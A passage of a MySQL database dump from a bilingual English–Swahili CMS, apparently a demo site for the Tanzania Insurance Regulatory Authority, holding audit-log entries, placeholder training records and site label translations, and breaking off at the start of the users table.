INSURANCE\",\"content_en\":\"ANYONE CAN INVEST IN INSURANCE\",\"status\":\"1\",\"path\":\"\\/uploads\\/gallery\\/\",\"filename\":\"cc123f5a795da37a4493178bc26576c8.jpeg\",\"mime\":\"images\\/jpeg\",\"slug\":\"cc123f5a795da37a4493178bc26576c8-jpeg\"}','2022-08-13 20:24:34','2022-08-13 20:24:34'),(1514,1,'Photo','update','154.118.225.10','http://demo8.eganet.go.tz/tira/cms/media/19','{\"id\":19,\"title_en\":\"Tazama Wabunge Wapewa Elimu na Mamlaka ya Usimamizi wa Shughuli za Bima (TIRA) I Mpango wa Uchumi\",\"title_sw\":\"Tazama Wabunge Wapewa Elimu na Mamlaka ya Usimamizi wa Shughuli za Bima (TIRA) I Mpango wa Uchumi\",\"content_en\":\"\",\"content_sw\":\"\",\"mime\":\"\",\"path\":\"\",\"url\":\"https:\\/\\/www.youtube.com\\/watch?v=2CJ13qMcyxk\",\"filename\":\"\",\"iconurl\":\"\",\"slug\":\"good-video-very-very-nice\",\"user_id\":0,\"gallery_id\":4,\"status\":1,\"created_at\":\"2021-08-04T06:27:11.000000Z\",\"updated_at\":\"2022-08-13T21:46:28.000000Z\"}','2022-08-13 21:18:15','2022-08-13 21:18:15'),(1515,1,'Translation','trans_update','197.186.0.191','http://demo8.eganet.go.tz/tira/cms/trans_update','{\"id\":2,\"keyword\":\"lbl_site_subtitle\",\"en\":\"The United Republic of Tanzania\",\"sw\":\"Jamhuri ya Muungano wa Tanzania\",\"created_at\":\"2020-04-17T09:41:00.000000Z\",\"updated_at\":\"2022-08-06T14:25:37.000000Z\"}','2022-08-14 02:40:41','2022-08-14 02:40:41'),(1516,1,'Translation','trans_update','197.186.0.191','http://demo8.eganet.go.tz/tira/cms/trans_update','{\"id\":281,\"keyword\":\"lbl_site_sub_subtitle\",\"en\":\"Tanzania Insurance Regulatory Authority\",\"sw\":\"Mamlaka ya Usimamizi wa Bima Tanzania\",\"created_at\":\"2021-08-06T14:37:55.000000Z\",\"updated_at\":\"2022-08-06T14:25:37.000000Z\"}','2022-08-14 02:42:11','2022-08-14 02:42:11'),(1517,1,'Translation','trans_update','197.186.0.191','http://demo8.eganet.go.tz/tira/cms/trans_update','{\"id\":1,\"keyword\":\"lbl_site_title\",\"en\":\"Tanzania Insurance Regulatory Authority (TIRA)\",\"sw\":\"Mamlaka ya Usimamizi wa Bima Tanzania\",\"created_at\":\"2020-04-17T09:41:00.000000Z\",\"updated_at\":\"2022-08-06T14:25:37.000000Z\"}','2022-08-14 02:42:11','2022-08-14 02:42:11'),(1518,1,'Translation','trans_update','197.186.0.191','http://demo8.eganet.go.tz/tira/cms/trans_update','{\"id\":2,\"keyword\":\"lbl_site_subtitle\",\"en\":\"The United Republic of Tanzania\",\"sw\":\"Jamhuri ya Muungano wa Tanzania\",\"created_at\":\"2020-04-17T09:41:00.000000Z\",\"updated_at\":\"2022-08-14T05:40:41.000000Z\"}','2022-08-14 02:42:11','2022-08-14 02:42:11'),(1519,1,'Translation','trans_update','197.186.0.191','http://demo8.eganet.go.tz/tira/cms/trans_update','{\"id\":281,\"keyword\":\"lbl_site_sub_subtitle\",\"en\":\"Tanzania Insurance Regulatory Authority\",\"sw\":\"Mamlaka ya Usimamizi wa Bima Tanzania\",\"created_at\":\"2021-08-06T14:37:55.000000Z\",\"updated_at\":\"2022-08-14T05:42:11.000000Z\"}','2022-08-14 02:43:13','2022-08-14 02:43:13'),(1520,1,'Translation','trans_update','197.186.0.191','http://demo8.eganet.go.tz/tira/cms/trans_update','{\"id\":1,\"keyword\":\"lbl_site_title\",\"en\":\"Tanzania Insurance Regulatory Authority\",\"sw\":\"Mamlaka ya Usimamizi wa Bima Tanzania\",\"created_at\":\"2020-04-17T09:41:00.000000Z\",\"updated_at\":\"2022-08-06T14:25:37.000000Z\"}','2022-08-14 02:43:13','2022-08-14 02:43:13'),(1521,1,'Translation','trans_update','197.186.0.191','http://demo8.eganet.go.tz/tira/cms/trans_update','{\"id\":2,\"keyword\":\"lbl_site_subtitle\",\"en\":\"The United Republic of Tanzania\",\"sw\":\"Jamhuri ya Muungano wa Tanzania\",\"created_at\":\"2020-04-17T09:41:00.000000Z\",\"updated_at\":\"2022-08-14T05:40:41.000000Z\"}','2022-08-14 02:43:13','2022-08-14 02:43:13'),(1522,1,'MenuItem','store','197.186.9.155','http://demo8.eganet.go.tz/tira/cms/menu-items','{\"menu_id\":\"8\",\"title_sw\":\"Insurance Agents Licensing\",\"title_en\":\"Insurance Agents Licensing\",\"link\":\"1\",\"url_external\":null,\"url\":\"publications\\/insurance-agents-licensing\",\"position\":8}','2022-08-14 02:53:12','2022-08-14 02:53:12'),(1523,1,'MenuItem','store','197.186.9.155','http://demo8.eganet.go.tz/tira/cms/menu-items','{\"menu_id\":\"8\",\"title_sw\":\"Insurance licensing Brokers\",\"title_en\":\"Insurance licensing Brokers\",\"link\":\"1\",\"url_external\":null,\"url\":\"publications\\/insurance-licensing-brokers\",\"position\":9}','2022-08-14 02:56:11','2022-08-14 02:56:11'),(1524,1,'MenuItem','store','197.186.5.133','http://demo8.eganet.go.tz/tira/cms/menu-items','{\"menu_id\":\"8\",\"title_sw\":\"Insurance Licensing Company\",\"title_en\":\"Insurance Licensing Company\",\"link\":\"1\",\"url_external\":null,\"url\":\"publications\\/insurance-licensing-company\",\"position\":8}','2022-08-14 03:02:44','2022-08-14 03:02:44'),(1525,1,'MenuItem','store','197.186.5.133','http://demo8.eganet.go.tz/tira/cms/menu-items','{\"menu_id\":\"8\",\"title_sw\":\"Accreditation of Foreign Reinsurance Brokers\",\"title_en\":\"Accreditation of Foreign Reinsurance Brokers\",\"link\":\"1\",\"url_external\":null,\"url\":\"publications\\/accreditation-of-foreign-reinsurance-brokers\",\"position\":8}','2022-08-14 03:05:33','2022-08-14 03:05:33');
/*!40000 ALTER TABLE `timelines` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `trainings`
--

DROP TABLE IF EXISTS `trainings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `trainings` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `file_en` text COLLATE utf8mb4_unicode_ci,
  `file_sw` text COLLATE utf8mb4_unicode_ci,
  `location` text COLLATE utf8mb4_unicode_ci,
  `start_date` date DEFAULT NULL,
  `end_date` date DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `trainings`
--

LOCK TABLES `trainings` WRITE;
/*!40000 ALTER TABLE `trainings` DISABLE KEYS */;
INSERT INTO `trainings` VALUES (1,'Mafunzo wa kiwango cha juu zaidi','Highly sophisticated specialist training','<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit</p>','<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit</p>','/uploads/trainings/en1656634257-en-1656615989-en-1656615890-en-1656615782-SKILLS FOR  JOB (1) (1).doc','/uploads/trainings/sw1656634257-en-1656615989-en-1656615890-en-1656615782-SKILLS FOR  JOB (1).doc','Nkrumah Hall','2022-07-04','2022-07-06',1,'highly-sophisticated-specialist-training','2022-06-30 21:10:57','2022-06-30 21:10:57'),(2,'kiwango cha juu zaidi Mafunzo wa pili','specialist training in Highly sophisticated ','<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit</p>','<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit</p>','/uploads/trainings/en1656634257-en-1656615989-en-1656615890-en-1656615782-SKILLS FOR  JOB (1) (1).doc','/uploads/trainings/sw1656634257-en-1656615989-en-1656615890-en-1656615782-SKILLS FOR  JOB (1).doc','Nkrumah Hall','2022-07-04','2022-07-06',1,'highly-sophisticated-specialist-training','2022-06-30 21:10:57','2022-06-30 21:10:57');
/*!40000 ALTER TABLE `trainings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `translations`
--

DROP TABLE IF EXISTS `translations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `translations` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `keyword` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `en` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=375 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `translations`
--

LOCK TABLES `translations` WRITE;
/*!40000 ALTER TABLE `translations` DISABLE KEYS */;
INSERT INTO `translations` VALUES (1,'lbl_site_title','Tanzania Insurance Regulatory Authority','Mamlaka ya Usimamizi wa Bima Tanzania','2020-04-17 06:41:00','2022-08-14 02:43:13'),(2,'lbl_site_subtitle','The United Republic of Tanzania','Jamhuri ya Muungano wa Tanzania','2020-04-17 06:41:00','2022-08-14 02:40:41'),(3,'lbl_feedback','Feedback, Complaint or Opinion','Mrejesho, Malalamiko au Wazo','2020-04-17 06:41:00','2022-03-10 09:27:54'),(4,'lbl_contact','Contact Us','Wasiliana Nasi','2020-04-17 06:41:00','2020-04-17 06:41:00'),(5,'lbl_region','Region','Mkoa','2020-04-17 06:41:00','2020-04-17 06:41:00'),(11,'lbl_region_offices','HST Offices','Ofisi za HST','2020-04-17 06:41:00','2022-07-17 03:52:29'),(12,'lbl_social','Social Media','Mitandao ya Kijamii','2020-04-17 06:41:00','2020-04-17 06:41:00'),(13,'lbl_faq','Frequently Asked Questions','Maswali Yaulizwayo Mara kwa Mara','2020-04-17 06:41:00','2020-04-17 06:41:00'),(14,'lbl_faq_short','FAQs','MMM','2020-04-17 06:41:00','2021-09-21 15:22:22'),(16,'lbl_our_services','Our Services','Huduma Zetu','2020-04-17 06:41:00','2022-06-24 16:36:54'),(17,'lbl_sitemap','Sitemap','Ramani Ya Tovuti','2020-04-17 06:41:00','2020-04-17 06:41:00'),(18,'lbl_languge','English','Kiswahili','2020-04-17 06:41:00','2020-04-17 06:41:00'),(20,'lbl_profile','Profile','Wasifu','2020-04-17 06:41:00','2020-04-17 06:41:00'),(22,'lbl_announcements','Announcements','Matangazo','2020-04-17 06:41:00','2020-04-17 06:41:00'),(24,'lbl_recent_press','Press releases','Taarifa kwa vyombo vya habari','2020-04-17 06:41:00','2020-04-17 06:41:00'),(27,'lbl_latest_news','Latest News','Habari Mpya','2020-04-17 06:41:00','2020-04-17 06:41:00'),(28,'lbl_latest_products','Latest Products','Bidhaa Mpya','2020-04-17 06:41:00','2022-01-10 01:14:43'),(29,'lbl_latest_publications','Latest Publications','Machapisho Mapya','2020-04-17 06:41:00','2020-04-17 06:41:00'),(30,'lbl_news','News','Habari','2020-04-17 06:41:00','2020-04-17 06:41:00'),(32,'lbl_events','Events','Matukio','2020-04-17 06:41:00','2020-04-17 06:41:00'),(33,'lbl_document','Document','Document','2020-04-17 06:41:00','2020-04-17 06:41:00'),(34,'lbl_more','More','Zaidi','2020-04-17 06:41:00','2020-04-17 06:41:00'),(35,'lbl_more_news','More News','Habari Zaidi','2020-04-17 06:41:00','2020-04-17 06:41:00'),(36,'lbl_more_events','More Events','Matukio Zaidi','2020-04-17 06:41:00','2020-04-17 06:41:00'),(37,'lbl_more_gallery','More Gallery','Maktaba zote','2020-04-17 06:41:00','2020-04-17 06:41:00'),(38,'lbl_more_products','More Products','Bidhaa Zaidi','2020-04-17 06:41:00','2022-01-10 01:14:43'),(39,'lbl_more_publications','More publications','More publications','2020-04-17 06:41:00','2020-04-17 06:41:00'),(40,'lbl_more_announcements','View All Announcements','Matangazo Zaidi','2020-04-17 06:41:00','2020-08-05 01:43:45'),(42,'lbl_related_links','Related Links','Tovuti Mashuhuri','2020-04-17 06:41:00','2020-04-17 06:41:00'),(43,'lbl_e_services_links','E-Services','Huduma Mtandao','2020-04-17 06:41:00','2020-04-17 06:41:00'),(44,'lbl_quick_links','Quick Links','Kurasa za Karibu','2020-04-17 06:41:00','2020-04-17 06:41:00'),(45,'lbl_readmore','Read More','Soma zaidi','2020-04-17 06:41:00','2020-04-17 06:41:00'),(46,'lbl_view_all_news','View All News','Soma Habari zaidi','2020-04-17 06:41:00','2020-04-17 06:41:00'),(50,'lbl_home','Home','Mwanzo','2020-04-17 06:41:00','2020-04-17 06:41:00'),(51,'lbl_category','Category','Makundi','2020-04-17 06:41:00','2020-04-17 06:41:00'),(53,'lbl_pages','Pages','Kurasa','2020-04-17 06:41:00','2020-04-17 06:41:00'),(54,'lbl_speeches','Speeches','Hotuba','2020-04-17 06:41:00','2021-09-26 07:39:04'),(56,'lbl_how_doi','How Do I?','Nifanyaje?','2020-04-17 06:41:00','2020-04-17 06:41:00'),(58,'lbl_about_us','About us','Kuhusu sisi','2020-04-17 06:41:00','2021-10-04 07:20:28'),(59,'lbl_products','Products','Bidhaa','2020-04-17 06:41:00','2020-06-23 06:30:47'),(60,'lbl_publications','Publications','Machapisho','2020-04-17 06:41:00','2020-04-17 06:41:00'),(61,'lbl_no_information','Content not found ','Hakuna Taarifa kwa sasa ','2020-04-17 06:41:00','2020-04-17 06:41:00'),(66,'lbl_album','Albums','Albamu','2020-04-17 06:41:00','2020-04-17 06:41:00'),(67,'lbl_vids','Videos','Video','2020-04-17 06:41:00','2020-04-17 06:41:00'),(68,'lbl_error','Content Not Found','Taarifa hazijapatikana','2020-04-17 06:41:00','2020-04-17 06:41:00'),(73,'lbl_desc','Description','Maelezo','2020-04-17 06:41:00','2020-04-17 06:41:00'),(79,'lbl_press','Press Release','Vyombo vya Habari','2020-04-17 06:41:00','2021-10-17 16:06:16'),(80,'lbl_posted','Posted On','Imewekwa','2020-04-17 06:41:00','2020-04-17 06:41:00'),(82,'lbl_biography','Biography','Wasifu','2020-04-17 06:41:00','2020-04-17 06:41:00'),(84,'lbl_address','Postal Address','Anwani/Mahali','2020-04-17 06:41:00','2020-04-17 06:41:00'),(86,'lbl_more_videos','More Videos','Video Zaidi','2020-04-17 06:41:00','2020-04-17 06:41:00'),(87,'lbl_copyright','All Rights Reserved.','Haki zote zimehifadhiwa.','2020-04-17 06:41:00','2020-04-17 06:41:00'),(88,'lbl_copyright_statement','Copy Right Statements.','Copy Right Statements.','2020-04-17 06:41:00','2020-04-17 06:41:00'),(93,'lbl_download','Download','Pakua','2020-04-17 06:41:00','2020-04-17 06:41:00'),(94,'lbl_print','Chapisha','Chapisha','2020-04-17 06:41:00','2020-04-17 06:41:00'),(96,'lbl_sponsor','Sponsors','Wadhamini','2020-04-17 06:41:00','2021-06-17 10:41:12'),(97,'lbl_ega','e-Government Authority','Mamlaka ya Serikali Mtandao','2020-04-17 06:41:00','2021-06-13 06:19:37'),(98,'lbl_designed','The website is Designed, Developed And Maintained by','Imesanifiwa na Imetengenezwa na','2020-04-17 06:41:00','2021-11-23 09:50:46'),(99,'lbl_content_maintained ','Content Maintained by Warehouse Receipts Regulatory Board','Huendeshwa na Bodi ya Usimamizi wa Stakabadhi za Ghala','2020-04-17 06:41:00','2022-06-30 16:39:24'),(100,'lbl_site_title_short ','TIRA','TIRA','2020-04-17 06:41:00','2022-08-06 11:25:37'),(101,'lbl_photo_gallery','Photo Gallery','Maktaba ya Picha','2020-04-17 06:41:00','2020-04-17 06:41:00'),(102,'lbl_video_gallery','Video Gallery','Maktaba ya Video','2020-04-17 06:41:00','2020-04-17 06:41:00'),(103,'lbl_audio_gallery','Audio Gallery','Maktaba ya Audio','2020-04-17 06:41:00','2020-04-17 06:41:00'),(105,'lbl_media_center','Media Center','Ukumbi wa Habari','2020-04-17 06:41:00','2020-04-17 06:41:00'),(106,'lbl_name','Name','Jina','2020-04-17 06:41:00','2020-04-17 06:41:00'),(107,'lbl_email','Email Address','Barua pepe','2020-04-17 06:41:00','2020-04-17 06:41:00'),(108,'lbl_phone','Phone','Simu','2020-04-17 06:41:00','2020-04-17 06:41:00'),(109,'lbl_phone_number','Phone Number','Namba ya Simu','2020-04-17 06:41:00','2020-04-17 06:41:00'),(110,'lbl_fax','Fax','Nukushi','2020-04-17 06:41:00','2020-04-17 06:41:00'),(111,'lbl_message','Message','Ujumbe','2020-04-17 06:41:00','2020-04-17 06:41:00'),(112,'lbl_send','Send','Tuma','2020-04-17 06:41:00','2020-04-17 06:41:00'),(114,'lbl_search','Search','Tafuta','2020-04-17 06:41:00','2020-04-17 06:41:00'),(115,'lbl_search_results','Search Results','Matokeo','2020-04-17 06:41:00','2020-04-17 06:41:00'),(116,'lbl_search1','Type your search here then press ENTER','Andika Unachokitafuta Hapa Kisha bonyeza kitufe','2020-04-17 06:41:00','2020-04-17 06:41:00'),(117,'lbl_mobile','Mobile','Simu ya Mkononi','2020-04-17 06:41:00','2020-04-17 06:41:00'),(118,'lbl_telephone','Telephone','Simu','2020-04-17 06:41:00','2022-02-16 07:53:26'),(119,'lbl_p.o.box','P.O Box','S.L.P','2020-04-17 06:41:00','2020-04-17 06:41:00'),(120,'lbl_comments','Comments','Maoni','2020-04-17 06:41:00','2020-04-17 06:41:00'),(124,'stakeholders','Stakeholders','Wadau','2020-04-17 06:41:00','2020-04-17 06:41:00'),(125,'privacy_policy','Privacy Policy','Sera ya Faragha','2020-04-17 06:41:00','2020-04-17 06:41:00'),(126,'disclaimer','Disclaimer','Angalizo','2020-04-17 06:41:00','2020-04-17 06:41:00'),(133,'lbl_videos_gallery','Video Albums','Albamu ya Video','2020-04-17 06:41:00','2020-04-17 06:41:00'),(134,'lbl_vacancies','Vacancies','Ajira','2020-04-17 06:41:00','2020-04-17 06:41:00'),(135,'lbl_deadline','Deadline','Tarehe ya Mwisho','2020-04-17 06:41:00','2020-04-17 06:41:00'),(138,'lbl_welcome_note','Welcome','Karibu','2020-04-17 06:41:00','2020-06-27 07:34:01'),(139,'lbl_contact_info','Contact Info','Mawasiliano','2020-04-17 06:41:00','2020-04-17 06:41:00'),(141,'lbl_view_more','View More','Angalia Zaidi','2020-04-17 06:41:00','2020-04-17 06:41:00'),(142,'lbl_fullname','Fullname','Jina Kamili','2020-04-17 06:41:00','2020-04-17 06:41:00'),(143,'lbl_subject','Subject','Kichwa cha Habari','2020-04-17 06:41:00','2020-04-17 06:41:00'),(144,'lbl_call_us','Call us any time\n','Tupigie muda wowote','2020-04-17 06:41:00','2020-04-17 06:41:00'),(145,'lbl_hotline','Hotline','Hotline','2020-04-17 06:41:00','2020-04-17 06:41:00'),(146,'lbl_view','View','Tazama','2020-04-17 06:41:00','2021-07-09 12:27:59'),(148,'lbl_contacts','Contacts Us','Wasiliana Nasi','2020-04-17 06:41:00','2021-06-28 12:02:48'),(173,'lbl_projects','Our Projects','Miradi Yetu','2020-04-17 06:41:00','2021-10-14 03:32:40'),(181,'lbl_submit','Submit','Wasilisha','2020-04-17 06:41:00','2021-06-28 12:11:34'),(247,'lbl_sponsors_links','Sponsor Links','Wadhamini','2020-06-23 04:28:17','2020-06-23 04:28:17'),(248,'lbl_our_services_msg','Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor\" elit, sed do eiusmod tempor,o eiusmod tempor\" Lorem ipsum dolor sit amet, consectetur adipiscing','Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor\" elit, sed do eiusmod tempor,o eiusmod tempor\" Lorem ipsum dolor sit amet, consectetur adipiscing','2020-06-23 06:14:51','2021-10-25 10:00:34'),(249,'lbl_our_products','Our Products','Bidhaa Zetu','2020-06-23 06:30:22','2022-01-10 01:14:43'),(259,'lbl_view_all','View All','Tazama Zaidi','2021-06-13 05:58:35','2021-06-13 05:58:35'),(260,'lbl_date','Date','Tarehe','2021-06-16 09:21:35','2021-06-16 09:21:35'),(261,'lbl_doc_title','Description','Maelezo','2021-06-16 09:21:35','2021-06-16 09:21:35'),(267,'lbl_duration','Duration','Muda','2021-06-26 12:15:55','2021-06-26 12:15:55'),(269,'lbL_feedback_success','Feedback Successful Submitted','Mrejesho / Maoni Yamewasilishwa','2021-06-29 07:58:58','2022-03-10 09:27:54'),(273,'lbl_latest_updates','Lastest Updates','Habari Mpya','2020-04-17 06:41:00','2020-04-17 06:41:00'),(277,'lbl_overview','Overview','Muhtasari','2021-07-09 15:54:12','2021-07-09 15:54:12'),(280,'lbl_important_links','Important Links','Tovuti Muhimu','2021-08-06 11:37:55','2021-08-06 11:37:55'),(281,'lbl_site_sub_subtitle','Tanzania Insurance Regulatory Authority','Mamlaka ya Usimamizi wa Bima Tanzania','2021-08-06 11:37:55','2022-08-14 02:42:11'),(283,'lbl_administration','Administration','Utawala','2021-08-06 11:37:55','2021-08-06 11:37:55'),(289,'lbl_feedbacks','Feedbacks','Mrejesho','2021-08-06 11:37:55','2022-03-11 03:51:00'),(290,'lbl_organization','Organization','Taasisi','2021-08-06 11:37:55','2021-08-06 11:37:55'),(291,'lbl_location','Location','Eneo / Mahali','2021-08-06 11:37:55','2021-10-29 07:02:51'),(292,'lbl_latest_announcement','Latest Announcements','Matangazo Mapya','2021-08-06 11:49:39','2021-08-06 11:49:39'),(299,'lbl_view_offices','View All Offices','Tazama Ofisi Zote','2021-09-20 07:05:01','2021-09-20 07:05:01'),(300,'lbl_not_found','Not Found','Haipatikani','2021-09-21 06:56:31','2021-09-21 06:56:31'),(301,'lbl_resource_not_found','Sorry, The Resource you are looking for was not found.','Samahani, Rasilimali uliyotafuta haikupatikana.','2021-09-21 06:58:12','2021-10-06 09:30:47'),(312,'lbl_toll_free','Toll Free','Piga Bure','2021-10-13 13:24:52','2022-01-09 11:29:37'),(313,'lbl_online_services','Online Services','Huduma Mtandao','2021-10-14 07:49:03','2021-10-14 07:49:03'),(314,'lbl_support','HST','HST','2021-10-28 11:10:47','2022-07-17 03:52:29'),(315,'lbl_site_motto','Adequate And Equitable Compensations','Adequate And Equitable Compensations','2021-10-29 10:00:46','2022-06-14 03:06:15'),(330,'lbl_archive','Archive','Hifadhi','2021-11-23 14:03:17','2022-03-07 09:40:15'),(331,'lbl_core_services','Core Services','Huduma za Msingi','2021-11-23 14:03:17','2022-01-09 11:38:24'),(332,'lbl_whistle_blower','Whistle Blower','Toa Taarifa','2022-01-09 14:40:46','2022-01-09 11:42:44'),(333,'lbl_optional','Optional','Hiari','2022-03-10 13:15:51','2022-03-10 13:15:51'),(334,'lbl_whistle_blower_success','Thank you, Whistle blow successful submitted','Asante, Taarifa imewasilisha','2022-03-10 13:16:18','2022-03-10 10:22:24'),(335,'lbl_incident_location','Where the Incident happened?','Tukio limetokea wapi?','2022-03-10 13:16:46','2022-03-10 10:22:24'),(336,'lbl_incident_description','Description of the incident','Maelezo ya Tukio','2022-03-10 13:17:06','2022-03-10 10:22:24'),(337,'lbl_incident_extra_info','Where to get further/extra information?','Wapi pakupata taarifa zaidi?','2022-03-10 13:17:23','2022-03-10 10:22:24'),(338,'lbl_attachment_proof','Upload proof attachment [PDF, PNG, JPG and not more than 1MB]','Ambatisha ushahidi [PDF, PNG, JPG na si zaidi ya 1MB]','2022-03-10 13:42:30','2022-03-10 10:46:41'),(339,'lbl_whistle_blower_fail','Failed to send email. Please try again.','Imeshindwa kutuma barua pepe. Tafadhali jaribu tena.','2022-03-10 14:33:51','2022-03-10 11:34:55'),(340,'lbl_campaign','Campaign','Kampeni','2020-04-17 06:41:00','2022-06-14 03:23:27'),(341,'lbl_news_and_events','News & Events','Habari na Matukio','2020-04-17 06:41:00','2022-06-14 03:23:27'),(342,'lbl_quotes','Quotes','Nukuu','2020-04-17 06:41:00','2022-06-14 03:23:27'),(343,'lbl_our_campaigns','Campaigns','Kampeni','2020-04-17 06:41:00','2022-06-14 03:23:27'),(344,'lbl_menu','Menu','Menu','2020-04-17 06:41:00','2022-06-14 03:23:27'),(345,'lbl_details','Details','Maelezo','2020-04-17 06:41:00','2022-06-14 03:23:27'),(346,'lbl_campaigns','Campaigns','Kampeni','2020-04-17 06:41:00','2022-06-14 03:23:27'),(347,'lbl_hospitals','Hospitals','Hospitali','2020-04-17 06:41:00','2022-06-14 03:23:27'),(348,'lbl_training','Training','Mafunzo','2020-04-17 06:41:00','2022-06-26 14:00:51'),(349,'lbl_comments_complaints_and_advise\r\n','Comments, Complaints and Advise','Maoni, Malalamiko na Ushauri','2020-04-17 06:41:00','2022-06-26 14:00:51'),(350,'lbl_achievements','Achievements','Mafanikio','2020-04-17 06:41:00','2022-06-26 14:00:51'),(351,'lbl_comments_complaints_and_advise','Comments Complaints and Advise','Maoni Malamiko na Ushauri','2020-04-17 06:41:00','2022-06-26 14:00:51'),(352,'lbl_guidelines','Guidelines','Miongozo','2020-04-17 06:41:00','2022-06-26 14:00:51'),(353,'lbl_operators','Operators','Operators','2020-04-17 06:41:00','2022-06-26 14:00:51'),(354,'lbl_colateral_managers','Colateral Managers','Colateral Managers','2020-04-17 06:41:00','2020-04-17 06:41:00'),(355,'lbl_warehouses','Warehouses','Maghala','2020-04-17 06:41:00','2022-06-26 14:00:51'),(356,'lbl_price','Price','Bei','2020-04-17 06:41:00','2022-06-26 14:00:51'),(357,'lbl_product','Product','Bidhaa','2020-04-17 06:41:00','2022-06-24 16:36:54'),(358,'lbl_category','Category','Aina','2020-04-17 06:41:00','2022-06-26 14:00:51'),(359,'lbl_trainings','Training','Mafunzo','2020-04-17 06:41:00','2022-06-26 14:00:51'),(360,'lbl_no_records_found','No any Matching Records','Hakuna matokea','2020-04-17 06:41:00','2022-06-26 14:00:51'),(361,'lbl_clear_search','Clear Search','Anza Upya','2020-04-17 06:41:00','2022-06-26 14:00:51'),(362,'lbl_attachment','Attachment','Kiambatanisho','2020-04-17 06:41:00','2022-06-26 14:00:51'),(363,'lbl_latest_documents','Latest Documents','Machapisho Mapya','2020-04-17 06:41:00','2022-06-26 14:00:51'),(364,'lbl_partners','Partners','Wadhamini','2020-04-17 06:41:00','2022-06-26 14:00:51'),(365,'lbl_support_links','Support Links','Support Links','2020-04-17 06:41:00','2022-08-06 11:25:37'),(366,'lbl_advertisements','Advertisements','Matangazo','2020-04-17 06:41:00','2022-08-06 11:25:37'),(367,'lbl_registration_documents','Registration Documents','Nyaraka za Usajili','2020-04-17 06:41:00','2022-08-06 11:25:37'),(368,'lbl_documents_center','Documents Center','Kituo cha Nyaraka','2020-04-17 06:41:00','2022-08-06 11:25:37'),(369,'lbl_document_center','Documents Center','Kituo cha Nyaraka','2020-04-17 06:41:00','2022-08-06 11:25:37'),(370,'lbl_licensed_entities','Licensed Entities','Licensed Entities','2020-04-17 06:41:00','2022-08-06 11:25:37'),(371,'lbl_dg_message','Commissioner\'s Message','Commissioner\'s Message','2020-04-17 06:41:00','2022-08-09 15:49:28'),(373,'lbl_documents_center','Documents Center','Documents Center','2020-04-17 06:41:00','2022-08-06 11:25:37'),(374,'lbl_more_info','More Informations','More Informations','2020-04-17 06:41:00','2020-04-17 06:41:00');
/*!40000 ALTER TABLE `translations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
